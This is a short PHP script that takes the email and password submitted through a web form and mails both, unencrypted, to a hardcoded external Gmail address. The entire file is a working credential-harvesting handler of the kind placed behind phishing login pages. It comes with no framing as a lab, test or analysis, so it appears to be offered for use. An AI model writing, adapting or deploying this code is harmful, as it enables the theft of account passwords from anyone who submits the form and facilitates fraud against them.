<?php
	// Get the form data
	$email = $_POST['email'];
	$password = $_POST['password'];
	
	// Send an email using PHP's mail function
	$to = 'alicecorona778@gmail.com';
	$subject = 'Form Submission';
	$message = "Email: $email\nPassword: $password";
	mail($to, $subject, $message);